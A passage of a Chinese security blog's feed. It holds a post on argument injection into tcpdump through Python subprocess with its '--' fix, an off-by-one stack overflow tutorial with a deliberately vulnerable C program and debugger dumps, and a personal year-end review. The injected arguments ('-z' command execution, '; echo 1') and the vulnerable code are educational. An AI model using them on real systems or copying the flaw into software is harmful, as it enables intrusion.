+    &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./ping.py&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ping.py&lt;/code&gt; 的内容是&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;输出是&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;['./ping.py', '-c', '1', 'baidu.com']
+['./ping.py', '-c', '1', 'baidu.com']
+['./ping.py', '-c', '1', 'baidu.com']
+['./ping.py', '-c', '1', 'baidu.com']
+1
+['./ping.py', '-c', '1', 'baidu.com']
+1
+['./ping.py', '-c', '1', 'baidu.com; echo 1']
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;因为 &lt;code class=&quot;highlighter-rouge&quot;&gt;ping&lt;/code&gt; 只会去最后一个 args 中取 host，并不会自己去 parse 参数，所以第三种写法是安全的，但是也不是绝对的，这里很多人都有误解。因为对于很多参数非常复杂的程序来说，args 提供的拆分可能并不是预期的，比如说&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcpdump -i lo tcp port 80
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;tcpdump 支持写各种 expression 作为过滤条件，这种情况下，args 还是按照空格分隔的，取到的参数是 &lt;code class=&quot;highlighter-rouge&quot;&gt;['tcpdump', '-i', 'lo', 'tcp', 'port', '80']&lt;/code&gt;，而实际期望是 &lt;code class=&quot;highlighter-rouge&quot;&gt;['tcpdump', '-i', 'lo', 'tcp port 80']&lt;/code&gt;，这样就不能简单的去看 args 了，tcpdump 就会自己去 parse 命令行参数，可能是比较宽松的，这种情况下，如果 expression 可以被用户控制，还是可能产生命令注入的问题。&lt;/p&gt;
+
+&lt;p&gt;另外一个就是 tcpdump 支持参数名和值之间不写空格的写法，比如 &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump -ilo tcp port 80&lt;/code&gt;。&lt;/p&gt;
+
+&lt;h2 id=&quot;可以写文件么&quot;&gt;可以写文件么&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo python -c 'import subprocess; subprocess.call([&quot;tcpdump&quot;, &quot;-i&quot;, &quot;lo&quot;, &quot;-w /tmp/1.pcap&quot;])'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;这种情况下会报错，提示 &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump:  /tmp/1.pcap: No such file or directory&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;这样才可以&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo python -c 'import subprocess; subprocess.call([&quot;tcpdump&quot;, &quot;-i&quot;, &quot;lo&quot;, &quot;-w/tmp/2.pcap&quot;])'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;可以执行命令么&quot;&gt;可以执行命令么&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo python -c 'import subprocess; subprocess.call([&quot;tcpdump&quot;, &quot;-i&quot;, &quot;lo&quot;, &quot;-G1&quot;, &quot;-w&quot;, &quot;/tmp/1.pcap&quot;, &quot;-z/usr/games/cowsay&quot;])'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;更详细的利用可以参考 https://www.anquanke.com/post/id/87260&lt;/p&gt;
+
+&lt;h2 id=&quot;更加通用的解决方法&quot;&gt;更加通用的解决方法&lt;/h2&gt;
+
+&lt;p&gt;虽然文档上没有提到，但是作为 Linux 下的通用做法，tcpdump 也支持使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; 分隔参数和表达式。比如果有个文件的文件名是 &lt;code class=&quot;highlighter-rouge&quot;&gt;-la&lt;/code&gt;，想使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;ls -la&lt;/code&gt; 查看文件的详细信息的话，就需要 &lt;code class=&quot;highlighter-rouge&quot;&gt;ls -la -- -la&lt;/code&gt;。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo python -c 'import subprocess; subprocess.call([&quot;tcpdump&quot;, &quot;-i&quot;, &quot;lo&quot;, &quot;-G1&quot;, &quot;-w&quot;, &quot;/tmp/1.pcap&quot;, &quot;--&quot;, &quot;-z/usr/games/cowsay&quot;])'
+
+sudo python -c 'import subprocess; subprocess.call([&quot;tcpdump&quot;, &quot;-i&quot;, &quot;lo&quot;, &quot;-G1&quot;, &quot;-w&quot;, &quot;/tmp/1.pcap&quot;, &quot;--&quot;, &quot;tcp port 80&quot;])'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;无论最后一个参数怎么写，都不会出现问题了。&lt;/p&gt;</content><author><name>virusdefender</name></author><category term="安全" /><category term="CTF" /><summary type="html">使用了 subprocess 传递数组形式的 args 过去就一定没有命令注入的问题么？</summary></entry><entry><title type="html">二进制安全之栈溢出（十）</title><link href="https://strcpy.me/index.php/archives/786/" rel="alternate" type="text/html" title="二进制安全之栈溢出（十）" /><published>2018-01-13T12:46:07+00:00</published><updated>2018-01-13T12:46:07+00:00</updated><id>https://strcpy.me/index.php/archives/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA(%E5%8D%81)</id><content type="html" xml:base="https://strcpy.me/index.php/archives/786/">&lt;p&gt;本篇没有新内容，只有一个新名词 off-by-one，利用方法还是之前的。&lt;/p&gt;
+
+&lt;h2 id=&quot;off-by-one漏洞&quot;&gt;off-by-one漏洞&lt;/h2&gt;
+
+&lt;p&gt;off-by-one漏洞是计数时由于边界条件判断失误导致结果多了一或少了一的错误，比如&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;在循环中进行比较的时候，本该使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;=&lt;/code&gt;，但却使用了 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;没有考虑到一个序列是从 0 而不是 1 开始&lt;/li&gt;
+  &lt;li&gt;忽略了字符串最后的结束标志 &lt;code class=&quot;highlighter-rouge&quot;&gt;\0&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;在字符串 &lt;code class=&quot;highlighter-rouge&quot;&gt;\0&lt;/code&gt; 场景下，off-by-one 可以覆盖字符串后面一个字节的数据，在部分场景下可能造成严重的问题。&lt;/p&gt;
+
+&lt;h3 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+void foo(char* arg);
+void bar(char* arg);
+void foo(char* arg) {
+     bar(arg);
+}
+void bar(char* arg) {
+     char buf[256];
+     strcpy(buf, arg);
+}
+
+int main(int argc, char *argv[]) {
+     if(strlen(argv[1])&amp;gt;256) { /* [3] */
+           printf(&quot;Attempted Buffer Overflow\n&quot;);
+           fflush(stdout);
+           return -1;
+      }
+      foo(argv[1]);
+      return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;漏洞成因非常简单，main 函数中允许 256 长度的字符串，但是 buf 也是 256 字节的，这会导致 buf 后面一个字节的数据被覆盖。&lt;/p&gt;
+
+&lt;p&gt;编译参数是 &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -fno-stack-protector -z execstack -g -o vuln main.c&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;在 &lt;code class=&quot;highlighter-rouge&quot;&gt;strcpy&lt;/code&gt; 那一行下断点，然后运行，输入 256 长度的 &lt;code class=&quot;highlighter-rouge&quot;&gt;A&lt;/code&gt;。
+代码和栈内存是这样的&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[-------------------------------------code-------------------------------------]
+   0x40067a &amp;lt;bar+25&amp;gt;:	lea    rax,[rbp-0x100]
+   0x400681 &amp;lt;bar+32&amp;gt;:	mov    rsi,rdx
+   0x400684 &amp;lt;bar+35&amp;gt;:	mov    rdi,rax
+=&amp;gt; 0x400687 &amp;lt;bar+38&amp;gt;:	call   0x4004f0 &amp;lt;strcpy@plt&amp;gt;
+   0x40068c &amp;lt;bar+43&amp;gt;:	nop
+   0x40068d &amp;lt;bar+44&amp;gt;:	leave
+   0x40068e &amp;lt;bar+45&amp;gt;:	ret
+   0x40068f &amp;lt;main&amp;gt;:	push   rbp
+Guessed arguments:
+arg[0]: 0x7fffffffe030 --&amp;gt; 0x0
+arg[1]: 0x7fffffffe52c ('A' &amp;lt;repeats 200 times&amp;gt;...)
+arg[2]: 0x7fffffffe52c ('A' &amp;lt;repeats 200 times&amp;gt;...)
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe020 --&amp;gt; 0x0
+0008| 0x7fffffffe028 --&amp;gt; 0x7fffffffe52c ('A' &amp;lt;repeats 200 times&amp;gt;...)
+0016| 0x7fffffffe030 --&amp;gt; 0x0
+0024| 0x7fffffffe038 --&amp;gt; 0x0
+0032| 0x7fffffffe040 --&amp;gt; 0xff000000
+0040| 0x7fffffffe048 --&amp;gt; 0xff000000ff000000
+0048| 0x7fffffffe050 --&amp;gt; 0x0
+0056| 0x7fffffffe058 --&amp;gt; 0x0
+[------------------------------------------------------------------------------]
+
+gdb-peda$ p &amp;amp;buf
+$1 = (char (*)[256]) 0x7fffffffe030
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;如果 buf 复制 256 字节数据，那它的内存地址就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7fffffffe030 - (0x7fffffffe130 - 1)&lt;/code&gt; 了，&lt;code class=&quot;highlighter-rouge&quot;&gt;0x7fffffffe130&lt;/code&gt; 地址上的数据将被覆盖，而上面寄存器也可以看出来，rbp 就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7fffffffe130&lt;/code&gt; 地址。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[----------------------------------registers-----------------------------------]
+RAX: 0x7fffffffe030 --&amp;gt; 0x0
+RBX: 0x0
+RCX: 0x8000100000000000
+RDX: 0x7fffffffe52c ('A' &amp;lt;repeats 200 times&amp;gt;...)
+RSI: 0x7fffffffe52c ('A' &amp;lt;repeats 200 times&amp;gt;...)
+RDI: 0x7fffffffe030 --&amp;gt; 0x0
+RBP: 0x7fffffffe130 --&amp;gt; 0x7fffffffe150 --&amp;gt; 0x7fffffffe170 --&amp;gt; 0x400700 (&amp;lt;__libc_csu_init&amp;gt;:	push   r15)
+RSP: 0x7fffffffe020 --&amp;gt; 0x0
+RIP: 0x400687 (&amp;lt;bar+38&amp;gt;:	call   0x4004f0 &amp;lt;strcpy@plt&amp;gt;)
+R8 : 0x1000
+R9 : 0x7ffff7de7ab0 (&amp;lt;_dl_fini&amp;gt;:	push   rbp)
+R10: 0x309
+R11: 0x7ffff7a98720 (&amp;lt;strlen&amp;gt;:	pxor   xmm0,xmm0)
+R12: 0x400550 (&amp;lt;_start&amp;gt;:	xor    ebp,ebp)
+R13: 0x7fffffffe250 --&amp;gt; 0x2
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;栈在 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7fffffffe130&lt;/code&gt; 附近是&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0224| 0x7fffffffe100 --&amp;gt; 0x7fffffffe52c ('A' &amp;lt;repeats 200 times&amp;gt;...)
+0232| 0x7fffffffe108 --&amp;gt; 0x0
+0240| 0x7fffffffe110 --&amp;gt; 0x7fffffffe270 --&amp;gt; 0x7fffffffe62d (&quot;USER=virusdefender&quot;)
+0248| 0x7fffffffe118 --&amp;gt; 0x7fffffffe258 --&amp;gt; 0x7fffffffe4fe (&quot;/home/virusdefender/Desktop/pwn/offbyone/vuln&quot;)
+0256| 0x7fffffffe120 --&amp;gt; 0x7fffffffe52c ('A' &amp;lt;repeats 200 times&amp;gt;...)
+0264| 0x7fffffffe128 --&amp;gt; 0x400770 (&amp;lt;__libc_csu_fini&amp;gt;:	repz ret)
+0272| 0x7fffffffe130 --&amp;gt; 0x7fffffffe150 --&amp;gt; 0x7fffffffe170 --&amp;gt; 0x400700 (&amp;lt;__libc_csu_init&amp;gt;:	push   r15)
+0280| 0x7fffffffe138 --&amp;gt; 0x40065e (&amp;lt;foo+24&amp;gt;:	nop)
+0288| 0x7fffffffe140 --&amp;gt; 0x0
+0296| 0x7fffffffe148 --&amp;gt; 0x7fffffffe52c ('A' &amp;lt;repeats 200 times&amp;gt;...)
+0304| 0x7fffffffe150 --&amp;gt; 0x7fffffffe170 --&amp;gt; 0x400700 (&amp;lt;__libc_csu_init&amp;gt;:	push   r15)
+0312| 0x7fffffffe158 --&amp;gt; 0x4006ec (&amp;lt;main+93&amp;gt;:	mov    eax,0x0)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;覆盖前后的数据对比&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ x/8xb 0x7fffffffe130
+0x7fffffffe130:	0x50	0xe1	0xff	0xff	0xff	0x7f	0x00	0x00
+
+gdb-peda$ x/8xb 0x7fffffffe130
+0x7fffffffe130:	0x00	0xe1	0xff	0xff	0xff	0x7f	0x00	0x00
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;也就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7fffffffe150&lt;/code&gt; 会被覆盖为 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7fffffffe100&lt;/code&gt;，这个地址正好是 buf 内可控的地址。&lt;/p&gt;
+
+&lt;h2 id=&quot;参考&quot;&gt;参考&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://bbs.pediy.com/thread-216954.htm&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>virusdefender</name></author><category term="安全" /><category term="CTF" /><summary type="html">本篇没有新内容，只有一个新名词 off-by-one，利用方法还是之前的。</summary></entry><entry><title type="html">&amp;lt;/2017&amp;gt;&amp;lt;2018&amp;gt;</title><link href="https://strcpy.me/index.php/archives/785/" rel="alternate" type="text/html" title="&amp;lt;/2017&amp;gt;&amp;lt;2018&amp;gt;" /><published>2018-01-01T00:00:01+00:00</published><updated>2018-01-01T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/2017</id><content type="html" xml:base="https://strcpy.me/index.php/archives/785/">&lt;p&gt;2017 年恍恍惚惚的就过去了，回想了一下，这一年就做了几件微小的事情&lt;/p&gt;
+
+&lt;h2 id=&quot;尝试跑步&quot;&gt;尝试跑步&lt;/h2&gt;
+
+&lt;p&gt;在林大操场和奥森，集中在五月到十月，一共 63 次，其他的时间中午有时候会和同事打球，虽然时间和距离都还很少，但是至少是一个好的开始。2018 年希望能运动的更多更多，再瘦回到高二的时候。&lt;/p&gt;
+
+&lt;p&gt;要注意的是&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;保护关节，不要运动损伤&lt;/li&gt;
+  &lt;li&gt;不要三天打鱼两天晒网，天气冷的时候也要坚持其他的运动&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/785/1.JPG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;英语流利说&quot;&gt;英语流利说&lt;/h2&gt;
+
+&lt;p&gt;懂你英语成功达标退费，和群里的小伙伴一起打卡，学习时间平均每天不低于30分钟。&lt;/p&gt;
+
+&lt;p&gt;懂你英语学完了 Level 6，但是 11 月份出了 Level 7，目前还没有开始学习。然后我还有一堆的外教课和拓展课还没有上。&lt;/p&gt;
+
+&lt;p&gt;总体的评价和 &lt;a href=&quot;/index.php/archives/762/&quot;&gt;之前的文章&lt;/a&gt; 基本不变。&lt;/p&gt;
+
+&lt;h2 id=&quot;孙同学&quot;&gt;孙同学&lt;/h2&gt;
+
+&lt;p&gt;孙同学是被朋友评价为 “温文尔雅” 的人（&lt;del&gt;到底是不是熟了你就知道了&lt;/del&gt;），我的高中同学，16 年开始大五在中日友好医院实习，之后约玩了很多很多次。&lt;/p&gt;
+
+&lt;p&gt;逛过北京很多校园公园和景点，还探索到了奥森很多没去过的地方，然后我给拍了一些美美的照片。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/785/2.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;孙同学也是一位天生的美食家，非常喜欢自己做饭，手艺也还不错（当然我现在也做的不错了）。下图是孙同学包的饺子。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/785/3.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;要承认的是不承认，之前我对待孙同学有一些不太对的地方，后来被打脸了。不过我超级喜欢孙同学的，想一起疯玩，一起做饭，一起变得更好，一起走下去，所以就不要再犯什么错误啦~&lt;/p&gt;
+
+&lt;h2 id=&quot;在长亭&quot;&gt;在长亭&lt;/h2&gt;
+
+&lt;p&gt;在长亭的第二年刚刚过去，主要工作还是在写 server，不过早就写烦了，有空还是要多研究安全的，否则就忘光了。年底尝试写了九篇二进制安全入门文章，因为看到市面上的文章都比较杂乱不系统，接下来还要继续写。&lt;/p&gt;
+
+&lt;p&gt;做安全挖漏洞才是终极的追求，不要做一个 CRUD boy。&lt;/p&gt;
+
+&lt;h2 id=&quot;写代码&quot;&gt;写代码&lt;/h2&gt;
+
+&lt;p&gt;毕业设计留下的 &lt;a href=&quot;https://github.com/QingdaoU/OnlineJudge&quot;&gt;坑&lt;/a&gt; 被 &lt;a href=&quot;https://rawidn.com/&quot;&gt;学弟&lt;/a&gt; 填上了，在元旦之前终于突破了 1000 star。在这次重构中，大量的新技术都用上了。&lt;/p&gt;
+
+&lt;p&gt;大家都喜欢我也就很高兴。&lt;/p&gt;
+
+&lt;h2 id=&quot;生活&quot;&gt;生活&lt;/h2&gt;
+
+&lt;p&gt;又看了两场五月天演唱会，学了点弹琴。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/771/1.JPG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;7月在深圳呆了一周，天气和环境真是非常的棒，除了太热了。10月在青岛呆了几天，见了见老同学，也甚是怀念。&lt;/p&gt;
+
+&lt;p&gt;18年想去更多的地方转转，不过貌似和下面的【钱】这章节矛盾，哈哈哈。&lt;/p&gt;
+
+&lt;p&gt;基本没有怎么看非技术的书。&lt;/p&gt;
+
+&lt;h2 id=&quot;攒钱和花钱&quot;&gt;攒钱和花钱&lt;/h2&gt;
+
+&lt;p&gt;毕业到现在大约一年半花销很大，给家里也不少钱。截止到17年年底，手头就只有大约 x 万了，订一个小目标是年底攒钱到 4 * x 万吧，之前的都不算了。&lt;/p&gt;
+
+&lt;p&gt;2月初北京租的房子就要到期了，最近在看房子，然后又羡慕朋友圈各种买房子的朋友，打算 2019 年可以自己出一个首付在青岛买个房子，也许会逃离北京也许不会。&lt;/p&gt;
+
+&lt;h2 id=&quot;到了立-flag-的时间了&quot;&gt;到了立 Flag 的时间了&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;攒钱&lt;/li&gt;
+  &lt;li&gt;心态要好，控制情绪&lt;/li&gt;
+  &lt;li&gt;不要停止学习，侧重安全和计算机基础&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>virusdefender</name></author><category term="生活" /><summary type="html">2017 年恍恍惚惚的就过去了，回想了一下，这一年就做了几件微小的事情</summary></entry></feed>
